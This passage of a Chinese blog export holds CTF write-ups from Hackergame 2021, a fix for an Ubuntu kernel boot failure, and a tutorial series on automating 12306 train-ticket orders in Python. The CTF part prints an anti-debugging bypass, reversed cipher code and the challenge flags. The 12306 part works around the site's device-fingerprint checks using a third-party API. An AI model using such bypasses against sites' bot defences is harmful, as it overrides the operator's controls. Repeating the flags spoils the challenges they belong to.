%}\n进入游戏，根据提示需要点亮顶上的三盏灯，在地图里跳了半天，并没有发现啥有价值的东西，但这题的定位是web，因此打开f12，然而出现了debugger无限阻塞调试，意识到它好像不太想让我调试JS代码，肯定在这里面有做文章。\n\n\n在Console里运行一下下面这个函数，然后重启开发者工具窗口，就可以快速反反调试：\n\n```js\n(function() {\n\tvar __Function__ = Function.__Function__ || Function;\n\tvar __Empty__ = Function.__Empty__ || function() {};\n\tFunction = function() {\n\t\tfor (var i=0; i<arguments.length; i++) {\n\t\t\tif ((typeof arguments[i] == 'string') && arguments[i].indexOf('debugger')>=0) {\n\t\t\t\treturn __Empty__;\n\t\t\t}\n\t\t}\n\t\treturn __Function__.apply(this, Array.prototype.slice.call(arguments, 0));\n\t}\n\tFunction.__proto__.constructor = Function;\n\tFunction.__Function__ = __Function__;\n})();\n```\n\n接下来，去寻找点灯的代码，在index即主页文件里可以找到以下有用信息：\n\n```js\nfunction printcinput(){\n  let content=document.getElementById('spann');\n  if (cinput[0]==='M') {\n    if (pressplateList[64].status===false){\n      pressplateList[64].TurnOn_redstone_lamp();\n      pressplateList[64].status=true;\n    }\n  }\n  if(cinput.length>=32){\n    let tbool=gyflagh(cinput.join(''));\n    if(tbool) {\n      pressplateList[65].TurnOn_redstone_lamp();\n      content.innerText='Congratulations!!!';\n      return;\n    }\n    cinput.length=0;\n  }\n  content.innerText=cinput.join('');\n}\n```\n\n猜一下应该是需要我们第一下踩'M'，然后再踩31个字符并使得`tbool`变量为`True`，不过这里只有两个`TurnOn_redstone_lamp`函数，却需要点三盏灯，试了一下发现第一下踩到M时总是会点亮两盏，大概是想让随机乱踩到M的同学觉得快要摸到flag了。\n\n\n进入`gyflagh`函数：\n\n```js\nfunction gyflagh(_0x111955) {\n    const _0x50051f = _0x22517d;\n    let _0x3b790d = _0x111955[_0x50051f(0x1a8)](_0x50051f(0x1b7));\n    if (_0x3b790d === _0x50051f(0x1aa))\n        return !![];\n    return ![];\n}\n```\n\n发现代码经过了混淆，但很容易通过调试知道它的意图，可以整理成以下样子（有经验的选手估计不需要整理）：\n\n```js\nfunction gyflagh(s) {\n    let encrypted = s['encrypt']('1356853149054377');\n    if (encrypted === '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c')\n        return true;\n    return false;\n}\n```\n\n看出是一个加密，对我们输入的字符串s用密钥\"1356853149054377\"加密得到结果为\"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\"，即可点亮三盏灯，对应的字符串\"s\"也就是flag（所以这题为什么不在math分类？）\n\n\n接下来只要简单分析一下字符串的`encrypt`方法即可，以下是我把代码还原成人能看的样子：\n\n```js\nString['prototype']['encrypt'] = function(input_string) {\n    let array1 = new Array(2);\n    let s = '';\n    plaintext = escape(this);\n    for (var i = 0; i < 4; i++)\n        array2[i] = Str4ToLong(input_string['slice'](i * 4, (i + 1) * 4));\n    //array2 = [909456177, 825439544, 892352820, 926364468],由于array2仅与input_string相关,故可以直接算出来当常量用\n    for (i = 0; i < plaintext['length']; i += 8) {\n        array1[0] = Str4ToLong(plaintext['slice'](i, i + 4)),\n        array1[1] = Str4ToLong(plaintext['slice'](i + 4, i + 8)),\n        code(array1, array2),\n        s += LongToBase16(array1[0]) + LongToBase16(array1[1]);\n    }\n    return s;\n}\n```\n\n其中，这里最重要的部分其实是`code`函数，而其他几个函数例如`Str4ToLong`、`LongToBase16`在浏览器中都存有逆函数，可以在Console窗口直接调用。我们只要写一个`code`的逆函数`decode`即可。code函数反混淆以后如下：\n\n```js\nfunction code(array1, array2) {\n    let a = array1[0]\n      , b = array1[1];\n    let array2 = [909456177, 825439544, 892352820, 926364468];//前面算出来的常量\n    const c = 2654435769\n      , d = 84941944608;\n    let i = 0;\n    while (i != d) {\n        a += (b << 4 ^ b >>> 5) + b ^ i + array2[i & 3],\n        i += c,\n        b += (a << 4 ^ a >>> 5) + a ^ i + array2[i >>> 11 & 3];\n    }\n    array1[0] = a,\n    array1[1] = b;\n}\n```\n\n根据`encrypt`方法，我们只需要关注`array1`的两个元素的变化，也就是code里的a和b，所以`decode`中我直接以a和b为参数，打印出还原后的a和b。`decode`的编写只要把`code`的代码反着写即可：\n\n```js\nfunction decode(a, b){\n    i = 84941944608;\n    c = 2654435769;\n    let array2 = [909456177, 825439544, 892352820, 926364468];//前面算出来的常量\n    while (i != 0){\n        b -= (a << 4 ^ a >>> 5) + a ^ i + array2[i >>> 11 & 3],\n        i -= c,\n        a -= (b << 4 ^ b >>> 5) + b ^ i + array2[i & 3];\n    }\n    console.log(a,b);\n}\n```\n\n这样，`encrypt`方法的加密结果完全可以反推回去了。\n\n\nflag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}\n\n---\n\n## p😭q\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n学会傅里叶的一瞬间，悔恨的泪水流了下来。\n\n\n当我看到音频播放器中跳动的频谱动画，月明星稀的夜晚，深邃的银河，只有天使在浅吟低唱，复杂的情感于我眼中溢出，像是沉入了雾里朦胧的海一样的温柔。\n\n\n这一刻我才知道，耳机音响也就图一乐，真听音乐还得靠眼睛。\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/6c37ab71466e3181698469ee55538787.gif)\n（注意：flag 花括号内是一个 12 位整数，由 0-9 数位组成，没有其它字符。）\n\n{% endnote %}\n{% endhideToggle %}\n这题给了一个GIF以及一个生成GIF的脚本：\n\n```python\n#!/usr/bin/env python3\n\nfrom array2gif import write_gif  # version: 1.0.4\nimport librosa  # version: 0.8.1\nimport numpy  # version: 1.19.5\n\nnum_freqs = 32\nquantize = 2\nmin_db = -60\nmax_db = 30\nfft_window_size = 2048\nframe_step_size = 512\nwindow_function_type = 'hann'\nred_pixel = [255, 0, 0]\nwhite_pixel = [255, 255, 255]\ny, sample_rate = librosa.load(\"flag.mp3\")  # sample rate is 22050 Hz\npower = librosa.feature.melspectrogram(y, sample_rate, n_mels=num_freqs,\n                                       n_fft=fft_window_size, hop_length=frame_step_size,\n                                       window=window_function_type)\ndb = librosa.power_to_db(power)\nspectrogram = (numpy.around(db / quantize) * quantize)\n\ngif_data = [numpy.kron(numpy.array(\n    [[red_pixel if freq % 2 and round(frame[freq // 2]) > threshold else white_pixel for threshold in list(range(\n        min_db, max_db + 1, quantize))[::-1]] for freq in range(num_freqs * 2 + 1)]),\n    numpy.ones([quantize, quantize, 1])) for frame in spectrogram.transpose()]\n\nwrite_gif(gif_data, 'radio.gif', fps=sample_rate / frame_step_size)\n\n```\n\n估计是要通过脚本的逻辑从gif反向生成原始的音频。\n\n\n注意到最后生成gif每一帧的函数：\n\n```python\ngif_data = [numpy.kron(numpy.array(\n    [[red_pixel if freq % 2 and round(frame[freq // 2]) > threshold else white_pixel for threshold in list(range(\n        min_db, max_db + 1, quantize))[::-1]] for freq in range(num_freqs * 2 + 1)]),\n    numpy.ones([quantize, quantize, 1])) for frame in spectrogram.transpose()]\n```\n\n虽然完全看不懂，但可以猜测到gif每一帧的红色条子的高度是有用的信息，因此第一步就是把每一帧中红色条子的高度读成一个向量。\n\n\n但我压根不懂这些频谱函数、分贝值之类的东西，因此我的方法是把第3题（自由电波）的mp3（懒得去找其他mp3了）用脚本跑了一下，拿到每一步的中间变量，例如`spectrogram`，然后和gif每一帧读出来的array进行对比，发现：\n\n```python\nvecs = []\n\ngif = Image.open(\"radio.gif\")\nframes = ImageSequence.Iterator(gif)\nfor frame in frames:\n    frame = np.array(frame)[:, ::2]\n    vec = frame.sum(0)[1::2]\n    vecs.append(vec)\n\nspec = np.array(vecs).astype('float32').transpose() - 60\n```\n\n这样就可以把gif还原回`spectrogram`了，接下来只要看`spectrogram`是怎么生成的，然后逆回去估计就差不多了：\n\n\n生成代码是这样的：\n\n```python\npower = librosa.feature.melspectrogram(y, sample_rate, n_mels=num_freqs,\n                                       n_fft=fft_window_size, hop_length=frame_step_size,\n                                       window=window_function_type)\ndb = librosa.power_to_db(power)\nspectrogram = (numpy.around(db / quantize) * quantize)\n```\n\n这里最后一步好像是做了一个取整之类的处理，但对值的影响应该不会特别大，我就直接把这里的`spectrogram`和`db`视为同一个东西，那么只要根据`spectrogram`得到`power`就好了，由`librosa.power_to_db`这个函数名猜测它还有一个叫`db_to_power`的函数，我写的反向代码：\n\n```python\npower = librosa.db_to_power(spec)\n# 最后再生成wav文件\ny = librosa.feature.inverse.mel_to_audio(power, sr=sample_rate,\n                                         n_fft=fft_window_size,\n                                         hop_length=frame_step_size,\n                                         window=window_function_type)\nsf.write('flag.wav', y, sample_rate)\n```\n\n本题全部解题代码：\n\n```python\n# -*- coding: utf-8 -*-\nimport os\nfrom PIL import Image, ImageSequence\nimport numpy as np\nimport librosa\nimport soundfile as sf\n\nnum_freqs = 32\nquantize = 2\nmin_db = -60\nmax_db = 30\nfft_window_size = 2048\nframe_step_size = 512\nwindow_function_type = 'hann'\nred_pixel = [255, 0, 0]\nsample_rate = 22050\n\nvecs = []\n\ngif = Image.open(\"radio.gif\")\nframes = ImageSequence.Iterator(gif)\nfor frame in frames:\n    frame = np.array(frame)[:, ::2]\n    vec = frame.sum(0)[1::2]\n    vecs.append(vec)\n\nspec = np.array(vecs).astype('float32').transpose() - 60\npower = librosa.db_to_power(spec)\ny = librosa.feature.inverse.mel_to_audio(power, sr=sample_rate,\n                                         n_fft=fft_window_size,\n                                         hop_length=frame_step_size,\n                                         window=window_function_type)\nsf.write('flag.wav', y, sample_rate)\n\n```\n\n最后听一下flag.wav即可拿到flag。\n\n\n<audio controls=\"\" src=\"https://oss.fyz666.xyz/blogfiles/wav/f22c38eb08aba5ad48038ab42e156b9d.wav\"></audio>\n\n\nflag{634971243582}\n\n---\n\n## 总结一下\n\n\n作为一个非科班出身的菜狗，目前玩了三届Hackergame，感觉Hackergame兼具专业性与趣味性，题目难度的梯度也很适合我这种从0学起的萌新，从前年的三等奖到今年的组内第4，抛开大佬们都跑去出题了的因素，感觉自身的提升也比较明显，打个比赛收获非常多，不亚于任何一门CS的专业课。\n\n\n明年争取多做几个逆向题吧！\n","tags":["Hackergame","Hackergame 2021"],"categories":["CTF题解"]},{"title":"Ubuntu开机黑屏左上角光标不闪烁的解决办法","url":"//blog/6585/","content":"\n不小心装错了显卡驱动，导致Ubuntu系统开机黑屏。这种情况很有可能是装驱动的时候生成了新的系统内核，然后GRUB默认用新内核启动，而新内核有问题导致的。\n\n遇到这种情况时，可以重启，进入GRUB界面时，选择Advanced options for Ubuntu，如果显示内容和下图类似，那么可以通过删除错误内核的方式，解决此问题。\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/8253ca42b0721521c45a1a193c326734.jpg)\n图片中显示有两个Linux内核，前面的5.4.0-87是默认内核，但无法正常启动，因此该内核是有问题的，我们可以选择第三个5.4.0-86，应该可以正常启动起来。\n\n\n在正常启动后，使用命令删除一些相关的包，然后删掉/boot路径下与5.4.0-87内核相关的所有内容，最后更新一下GRUB即可，命令如下：\n\n```bash\nsudo apt remove *5.4.0-87\nsudo update-grub\n```\n\n再次重启，发现已经可以正常启动了！\n","tags":["Linux"],"categories":["Debug"]},{"title":"Python实现12306购票（四）","url":"//blog/6532/","content":"\n该系列最后一篇文章，来实现提交订单（购票），不过：不支持付钱。\n\n本文只涉及一个函数`confirm_single_for_queue`，位于[此文件](https://github.com/windshadow233/12306/blob/main/bot/order.py)\n\n## 提交订单\n\n\n在前面余票查询完成后，我们就可以真正地提交订单了，提交订单的请求如下：\n\n`POST https://kyfw.12306.cn/otn/confirmPassenger/confirmSingleForQueue`\n\n\n参数：\n\n\n|  |  |  |\n| --- | --- | --- |\n| passengerTicketStr | oldPassengerStr | randCode |\n| purpose_codes | key_check_isChange | leftTicketStr |\n| train_location | choose_seats | seatDetailType |\n| is_jy | is_cj | whatsSelect |\n| roomType | dwAll | _json_att |\n| REPEAT_SUBMIT_TOKEN | encryptedData |  |\n\n前面几个参数（从`randCode`到`train_location`）都与前一篇文章一样，来自于`ticketInfoForPassengerForm`这个变量，`REPEAT_SUBMIT_TOKEN`与前面一样来自网页的JS变量：`globalRepeatSubmitToken`。另外有几个可以写死的参数：`seatDetailType=\"000\"`、`is_jy=\"N\"`、`is_cj=\"N\"`、`whatsSelect=\"1\"`、`roomType=\"00\"`、`dwAll=\"N\"`、`_json_att=\"\"`。\n\n\n这样一来，需要解决的只剩两个参数了：`choose_seats`、`encryptedData`\n\n\n### 选座功能\n\n`choose_seats`顾名思义是选座，JS代码如下：\n\n```js\nfunction j() {\n  var x = \"\";\n  $.each($(\"div#id-seat-sel div.seat-sel-bd a\"), function() {\n    if ($(this).hasClass(\"cur\")) {\n      var y = $(this).attr(\"id\");\n      x += y\n    }\n  });\n  return x\n}\n```\n\n简单分析一下代码，就是把选到的座位的id直接加起来。两个订单的选座界面长这样（若有n个订单则会有n排座位）：\n\n![](https://oss.fyz666.xyz/blogfiles/png/8b51eb674cbb8c697d1c278f10c2d515.png)\n找到其中一个座位的html代码如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/5a61c07862364b404cfa9bdc5684c2bb.png)\n根据这个id与前面的JS逻辑，就可以直接写出选座的逻辑了。举个例子，如果我选了第一排的A和第二排的B，那么`choose_seats`即是`1A2B`。\n\n\n### （没用的）加密数据\n\n\n解决了`choose_seats`，还剩最后一个最复杂的参数`encryptedData`。\n\n\n经过追踪，它来自于`window.json_ua.toString()`这个函数，它会产生一个比较随机的字符串，而这个函数来自于一个近三万行的[JS文件](https://mobile.12306.cn/otsmobile/antcaptcha/suite1608722853171.js)，该文件经过了压扁控制流混淆，通过大量的`switch case`语句将源代码打散，分析难度很大，我直接裂开。\n\n\n但后来我发现压根就不需要提交这个变量...那就不用研究了，真是喜大普奔。\n\n\n## 流程总结\n\n\n到此为止，12306的购票流程已经全部走了一遍，总结一下就是：\n\n\n1. 登录（建议扫二维码）\n2. 查票（`https://kyfw.12306.cn/otn/leftTicket/query`，该链接动态变化）\n3. 选票（`https://kyfw.12306.cn/otn/leftTicket/submitOrderRequest`）添加1个或多个订单\n4. 余票查询（`https://kyfw.12306.cn/otn/confirmPassenger/checkOrderInfo、https://kyfw.12306.cn/otn/confirmPassenger/getQueueCount`）\n5. 提交订单（`https://kyfw.12306.cn/otn/confirmPassenger/confirmSingleForQueue`）\n\n但毕竟12306平台异常复杂，代码中肯定会有不少处理不妥的地方，比如某些重要的参数被我偷懒直接写死了，但实际上可能会发生变化。若各位大佬有这方面的经验，希望能指出。\n","tags":["JavaScript","Python","爬虫"],"categories":["瞎捣鼓经历"]},{"title":"Python实现12306购票（三）","url":"//blog/6513/","content":"\n前面文章已经成功实现了登录，接下来就可以愉快地购票了，但在购票之前，我们需要知道12306处理订单的逻辑。\n\n本文相关代码见[此文件](https://github.com/windshadow233/12306/blob/main/bot/order.py)\n\n\n## 点击预定获取车票信息\n\n\n我们在网页端订票时，首先通过查票系统查到自己想要的票，然后点击右边的“预定”：\n\n![](https://oss.fyz666.xyz/blogfiles/png/465f7bc0bce1fe1e530261b34a4cb86b.png)\n然后会跳转到这个链接：\n\n`https://kyfw.12306.cn/otn/confirmPassenger/initDc`\n\n\n在此网页中可以添加订单与提交订单，最终实现购票。\n\n\n但我们没有为上面的链接提供任何关于车票信息的参数，网页是如何知道我们选择的是哪张车票呢？\n\n\n其实这是因为我们的浏览器会话在访问上面的链接之前还无意间发起过一个包含了车票信息的请求。\n\n\n我们在Network里抓包，可以发现，在点击“预定”按钮后产生了一条名为`submitOrderRequest`的包，如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/57d42b7d3a00a2a8bfc94fea71559fc0.png)\n它提交的表单信息中含有车票相关的信息，把它写下来如下：\n\n\n`POST https://kyfw.12306.cn/otn/leftTicket/submitOrderRequest`\n\n\n参数：\n\n\n| 参数 | 说明 |\n| --- | --- |\n| **secretStr** | 一串奇怪的字符串 |\n| **train_date** | 发车日期（格式%Y-%m-%d） |\n| **back_train_date** | 返程日期 |\n| **tour_flag** | 可以固定为“dc” |\n| **purpose_codes** | 可以固定为“ADULT” |\n| **query_from_station_name** | 出发站名 |\n| **query_to_station_name** | 到达站名 |\n| **undefined** | 固定为空串 |\n\n其中`back_train_date`参数为返程的日期，但由于我们买的是单程票，因此这一条数据其实是无关紧要的，和系统一样默认填当天的日期就行，同理，tour_flag指定了票为单程票，我们通常只会购买单程票，因此可以将它固定下来。\n\n\n另外，还有最重要的一个参数：`secretStr`，还记得前面查询车票时曾经看到过的很长的字符串吗？这里的`secretStr`值即是前面那个字符串经过urldecode以后的内容，我们只需用`urllib.parse.unquote`这个函数把它解码，再加入表单即可。\n\n\n该请求正常情况下将返回一条json数据，其中`result_code`字段告知响应状态，若为0则意味着请求通过。这里的代码可见`submit_order_request`函数。\n\n\n---\n\n## 提交订单与余票查询\n\n\n接下来，页面跳转到了订单页面：`https://kyfw.12306.cn/otn/confirmPassenger/initDc`\n\n\n我们通过手动添加乘车人，然后提交订单，可以抓到如下两条数据包：\n\n![](https://oss.fyz666.xyz/blogfiles/png/d02d15d467fc5e0f8b4deea6bba1923b.png)\n分别来看这两条请求分别做了什么事。\n\n\n### 提交订单\n\n`checkOrderInfo`\n\n![](https://oss.fyz666.xyz/blogfiles/png/a132c6b653794c96072b3779760f45fa.png)\n`POST https://kyfw.12306.cn/otn/confirmPassenger/checkOrderInfo`\n\n\n参数：\n\n\n|  |  |  |\n| --- | --- | --- |\n| bed_level_order_num | passengerTicketStr | oldPassengerStr |\n| tour_flag | randCode | whatsSelect |\n| sessionId | sig | scene |\n| _json_att | REPEAT_SUBMIT_TOKEN | cancel_flag |\n\n这条请求共设置了12个表单参数，我都写在了上面，但光看这些参数并不知道它们来自于哪里、分别表示什么意思，因此这里需要分析一下发起这条请求的JS代码。\n\n\n这段代码位于[这个文件](https://kyfw.12306.cn/otn/resources/merged/passengerInfo_js.js)，核心内容如下：\n\n```js\n$.ajax({\n  url: ctx + \"confirmPassenger/checkOrderInfo\",\n  type: \"post\",\n  data: {\n    cancel_flag: \"2\",\n    bed_level_order_num: \"000000000000000000000000000000\",\n    passengerTicketStr: getpassengerTickets(),\n    oldPassengerStr: getOldPassengers(),\n    tour_flag: ticketInfoForPassengerForm.tour_flag,\n    randCode: $(\"#randCode\").val(),\n    whatsSelect: $.whatsSelect(true) ? \"1\" : \"0\",\n    sessionId: csessionid,\n    sig: sig,\n    scene: \"nc_login\"\n  },\n  dataType: \"json\",\n  async: true,\n  ...\n})\n```\n\n从这里我们一眼就看出，'cancel_flag'、'bed_level_order_num'、'scene'的值都是可以写死的，然后来看两个passengerStr，第一个`passengerTicketStr`，来自于以下函数：\n\n```js\ngetpassengerTickets = function() {\n  var aA = \"\";\n  for (var aB = 0; aB < limit_tickets.length; aB++) {\n    var aC = limit_tickets[aB].seat_type + \",0,\" + limit_tickets[aB].ticket_type + \",\" + limit_tickets[aB].name + \",\" + limit_tickets[aB].id_type + \",\" + limit_tickets[aB].id_no + \",\" + (limit_tickets[aB].phone_no == null ? \"\" : limit_tickets[aB].phone_no) + \",\" + (limit_tickets[aB].save_status == \"\" ? \"N\" : \"Y\") + \",\" + limit_tickets[aB].allEncStr;\n      aA += aC + \"_\"\n  }\n  return aA.substring(0, aA.length - 1)\n}\n```\n\n由此，我们可以大概了解到`passengerTicketStr`的生成规则，是把订单的乘客信息和票务信息通过逗号拼接起来，若有多个订单，则将多个订单生成的Str用下划线拼接起来。我草率地实现了一下这个字符串的生成过程，见`generate_passenger_ticket_str`函数。\n\n\n另一个`oldPassengerStr`，JS函数如下：\n\n```js\ngetOldPassengers = function() {\n  var aE = \"\";\n  for (var aD = 0; aD < limit_tickets.length; aD++) {\n    var aA = limit_tickets[aD];\n    if (ticketInfoForPassengerForm.tour_flag == ticket_submit_order.tour_flag.fc || ticketInfoForPassengerForm.tour_flag == ticket_submit_order.tour_flag.gc) {\n      var aB = aA.name + \",\" + aA.id_type + \",\" + aA.id_no + \",\" + aA.passenger_type;\n      aE += aB + \"_\"\n    } else {\n      if (aA.only_id.indexOf(\"djPassenger_\") > -1) {\n        var aC = aA.only_id.split(\"_\")[1];\n        var aB = M[aC].passenger_name + \",\" + M[aC].passenger_id_type_code + \",\" + M[aC].passenger_id_no + \",\" + M[aC].passenger_type;\n        aE += aB + \"_\"\n      } else {\n        if (aA.only_id.indexOf(\"normalPassenger_\") > -1) {\n          var aC = aA.only_id.split(\"_\")[1];\n          var aB = az[aC].passenger_name + \",\" + az[aC].passenger_id_type_code + \",\" + az[aC].passenger_id_no + \",\" + az[aC].passenger_type;\n          aE += aB + \"_\"\n        } else {\n          aE += \"_ \"\n        }\n      }\n    }\n  }\n  return aE\n}\n```\n\n乍一看又臭又长，实际上只要注意到这两句代码：\n\n```js\nvar aB = aA.name + \",\" + aA.id_type + \",\" + aA.id_no + \",\" + aA.passenger_type;\naE += aB + \"_\"\n```\n\n将其用Python实现即可，代码见`generate_old_passenger_str`函数。\n\n\n这样两个字符串都可以成功生成了，我代码中的函数只针对单个订单进行了生成，若有多个订单，仍需要将其用下划线拼接起来，与`passengerTicketStr`不同，`oldPassengerStr`在拼接完以后，末尾还得额外加一个下划线。\n\n\n表单的其他几个参数，看上去都是常数，直接写死好像没什么问题。最后我处理这个请求的代码见check_order_info函数。\n\n\n\n\n---\n\n### 余票查询\n\n\n接下来是第二个请求：`getQueueCount`，这个请求用于余票查询：\n\n![](https://oss.fyz666.xyz/blogfiles/png/7d420dbce0f04996162fa569a0d5b36a.png)\n`POST https://kyfw.12306.cn/otn/confirmPassenger/getQueueCount`\n\n\n参数：\n\n\n|  |  |  |\n| --- | --- | --- |\n| train_date | train_no | stationTrainCode |\n| seatType | fromStationTelecode | toStationTelecode |\n| leftTicket | purpose_codes | train_location |\n| _json_att | REPEAT_SUBMIT_TOKEN |  |\n\n继续从JS代码来分析参数的生成过程，下面这段代码同样来自[这个文件](https://kyfw.12306.cn/otn/resources/merged/passengerInfo_js.js)。\n\n```js\n$.ajax({\n  url: ctx + \"confirmPassenger/getQueueCount\",\n  type: \"post\",\n  data: {\n    train_date: new Date(orderRequestDTO.train_date.time).toString(),\n    train_no: orderRequestDTO.train_no,\n    stationTrainCode: orderRequestDTO.station_train_code,\n    seatType: limit_tickets[0].seat_type,\n    fromStationTelecode: orderRequestDTO.from_station_telecode,\n    toStationTelecode: orderRequestDTO.to_station_telecode,\n    leftTicket: ticketInfoForPassengerForm.queryLeftTicketRequestDTO.ypInfoDetail,\n    purpose_codes: X,\n    train_location: ticketInfoForPassengerForm.train_location,\n    isCheckOrderInfo: Y\n  },\n  dataType: \"json\",\n  ...\n})\n```\n\n我们发现这里的参数字段似乎和前面抓包抓到的不太一样，其实是因为在ajax提交前，还有另一个JS文件对其表单内容做了修改，不过大体上不会影响我们分析数据的生成。\n\n\n这段代码里有两个新的变量不知道是啥，一个是`orderRequestDTO`，另一个是`ticketInfoForPassengerForm`，似乎只要得到了它们，就可以很舒服地生成这个表单。\n\n\n但是我查遍了整个文件，也没有找到定义`ticketInfoForPassengerForm`这个变量的地方，似乎它是一个全局变量。在开发者工具的Console里输入`ticketInfoForPassengerForm`执行，还真跳出来了一大串数据：\n\n![](https://oss.fyz666.xyz/blogfiles/png/d6d401734fe925fbd7a9a8d4be843b76.png)\n说明它确实是个全局变量，稍加搜索后，我发现它藏在订单页面（`https://kyfw.12306.cn/otn/confirmPassenger/initDc`）的html代码里：\n\n![](https://oss.fyz666.xyz/blogfiles/png/9a49a6f74f924865a97f15199017f567.png)\n而另一个变量`orderRequestDTO`则是`ticketInfoForPassengerForm`的一个字段。那就好办了，我们可以通过正则匹配把它匹配出来，然后用json库解析成Python可读的字典，即可顺利拿到表单数据。下面是正则匹配的代码，我还匹配了网页中的另一个变量，即`globalRepeatSubmitToken`，它就是我们抓到的包里带的参数`REPEAT_SUBMIT_TOKEN`\n\n```python\ninit_dc_url = 'https://kyfw.12306.cn/otn/confirmPassenger/initDc'\n\ndef get_init_info(self):\n    \"\"\"初始化车票下单页面信息\"\"\"\n    r = self.sess.get(self.init_dc_url)\n    form = re.search('ticketInfoForPassengerForm=(.+)', r.text).groups()[0][:-1].replace('\\'', '\"')\n    form = json.loads(form)\n    self.__setattr__('ticketInfoForPassengerForm', form)\n    self.__setattr__('submit_token', re.findall('globalRepeatSubmitToken = \\'(.*)\\'', r.text)[0])\n```\n\n在搞到这两个JS变量后，表单已经几乎可以填完整了，purpose_codes虽然没有明说来自哪里，但通过JS断点分析可以容易判断出它也是来自于ticketInfoForPassengerForm。还剩最后一个东西：train_date，看上去不就是个日期吗？但表单里的数据是长这样的：\n\n\n`train_date: Tue Oct 12 2021 00:00:00 GMT+0800 (中国标准时间)`\n\n\n这日期怎么花里胡哨的，再看JS代码长这样：\n\n```js\nnew Date(orderRequestDTO.train_date.time).toString()\n```\n\n试了一下发现JavaScript的日期转字符串居然真是这么花里胡哨，我懒得用Python去实现这么一个花里胡哨的日期字符串，因此最后我的实现方法是：\n\n```python\njs2py.eval_js(f'new Date({train_date}).toString()')\n```\n\n这样我们就顺利完成了余票查询请求，见get_queue_count函数\n\n\n下一篇文章将实现最后的提交订单请求。\n","tags":["JavaScript","Python","爬虫"],"categories":["瞎捣鼓经历"]},{"title":"Python实现12306购票（二）","url":"//blog/6488/","content":"\n这篇文章来分享一下我实现12306登录的过程。\n\n{% note info %}\n\n注：本文提到的`RAIL_DEVICEID`、`RAIL_EXPIRATION`参数在目前的版本中已经不需要了。\n\n{% endnote %}\n\n\n本文相关代码见[此文件](https://github.com/windshadow233/12306/blob/main/bot/login.py)\n\n![](https://oss.fyz666.xyz/blogfiles/png/606196b8c85cfadf7417383c53da233d.png)\n## 12306的登录方式\n\n12306网页端支持以上两种登录方式，点击立即登录，出现以下验证信息：\n\n![](https://oss.fyz666.xyz/blogfiles/png/5c9235b718149a4a8c493f8164f7a6d5.png)\n第一个滑块，感觉破解起来难度很大，先放一放，还有个短信验证，但经过我的尝试，该验证方式有每日次数限制，感觉不太爽，最舒服的登录方式当属扫二维码登录，因此我研究了一下二维码登录12306的机制。\n\n## 两种登录的途径\n\n{% tabs tab1 %}\n\n<!-- tab 二维码登录 -->\n\n\n打开浏览器的f12开发者界面进行抓包，然后点击二维码登录，在网络正常的情况下，可以成功抓到一条名为`create-qr64`的数据包，明显就是二维码的来源，打开看一下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/4560e8dc17b65b4a8e9a31acfb4d4f73.png)\n可见二维码图片是以base64编码方式发送到客户端的，同时发送过来的还有一个重要的参数：`uuid`，作为临时凭证唯一标识了每一个二维码。\n\n\n该请求详细情况如下：\n\n\n`POST https://kyfw.12306.cn/passport/web/create-qr64`\n\n\n参数：\n\n\n| 参数 | 值 |\n| --- | --- |\n| appid | otn |\n\n请求只有一个固定的参数为`appid`，值为`otn`，看似非常容易实现，不过当然，事情没那么简单，但暂时，我们可以先往下看后面的流程：\n\n\n在拿到验证码后，容易注意到浏览器又陆续发出了很多一样的包，名为`checkqr`，一看就是用来轮询二维码状态的，我们打开看一下其请求内容：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/af3a80da3caed0efac47845213dbfae6.png)\n`uuid`参数值就是前面生成二维码时拿到的`uuid`（这里图片里的`uuid`和前面的不一样，是因为我刷新过二维码了)另外，还出现了两个未曾见过的东西，`RAIL_DEVICEID`和`RAIL_EXPIRATION`。最开始，我无视这两个参数对这个登录流程进行了尝试，但发现后面的请求无法正常进行下去，因此这两个参数好像比较重要，我们分析一下来源。\n\n**RAIL_DEVICEID的获取方法**\n\n\n直接搜索`RAIL_DEVICEID`的值，我从茫茫请求中找到了它的来源：\n\n![](https://oss.fyz666.xyz/blogfiles/png/60b4a3977694410dc363c0b6bd1fdeec.png)\n这个请求的参数非常之长：\n\n![](https://oss.fyz666.xyz/blogfiles/png/52f2c433a20cb4e5c801a05abffbc125.png)\n经过我的分析，参数的生成代码位于[这个文件](https://kyfw.12306.cn/otn/HttpZF/GetJS)\n\n\n这个文件里的加密过程倒是容易理解，但它的算法居然一直在变，而且用了变量混淆，我第一天整理下来的JS文件，第二天就不能用了，让我郁闷了一段时间，后来才发现算法变了。最后我找到了一个[API](https://12306-rail-id-v2.pjialin.com)\n\n\n直接GET它，可以得到一串base64编码，将它解码，即可得到前面那串很长的请求链接，再通过这个链接，我们即可得到`RAIL_DEVICEID`和`RAIL_EXPRIATION`两个参数。不得不说这个API真香！\n\n\n获取了这俩参数以后，我们先把它们加到Cookie里，然后轮询二维码查看其状态，在得到扫码成功的状态后，即可进行下一步：身份认证。\n\n\n二维码登录过程的代码见`qr_login`函数。\n\n\n---\n\n**Uamtk认证**\n\n\n在二维码扫描成功并确认登录后（`checkqr`状态码为2），浏览器抓到了不少包，其中有两条分别名为`uamtk`和`uamauthclient`的吸引了我的注意。\n\n\n第一条，`uamtk`：\n\n\n`POST https://kyfw.12306.cn/passport/web/auth/uamtk`\n\n\n参数：\n\n\n| 参数 | 值 |\n| --- | --- |\n| appid | otn |\n\n也是一个固定参数，该请求的response会为会话设置一些新的Cookie：\n\n![](https://oss.fyz666.xyz/blogfiles/png/3b18eb4399a4ed6cd0560c636ce3e7e6.png)\n另外，这个请求将会返回一条json类型的数据，其中包含一条名为`newapptk`的字段，将其取出来，在接下来的请求中会用到。\n\n\n带着这些Cookie继续请求第二条URL：`uamauthclient`\n\n\n`POST https://kyfw.12306.cn/otn/uamauthclient`\n\n\n参数：\n\n\n| 参数 | 值 |\n| --- | --- |\n| tk | 前面获取到的`newapptk` |\n\n该请求将会得到一条包含用户信息的json数据，同时将`tk`设置为Cookie，这样会话就成功登录了。\n\n身份认证的代码见`_uamauth`函数。\n\n<!-- endtab -->\n\n<!-- tab SMS验证码登录 